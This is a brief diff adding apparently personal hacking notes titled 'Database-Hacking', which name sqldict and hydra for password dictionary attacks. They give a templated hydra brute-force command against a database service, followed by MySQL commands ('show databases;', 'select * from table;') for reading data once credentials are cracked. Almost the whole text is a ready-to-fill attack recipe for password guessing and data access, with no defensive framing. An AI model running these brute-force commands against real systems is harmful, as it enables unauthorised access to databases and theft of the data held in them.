@@ -1,0 +1,12 @@
+: Database-Hacking :
+: using password dictionary attacks :
+: sqldict : || : hydra : 
+
+hydra -l [username] -P [password-list] service://[url/ip]
+
+&
+//if we managed to crack credentials 
+we can use commands 
+show databases;
+use [table-name];
+select * from table; //execute queries
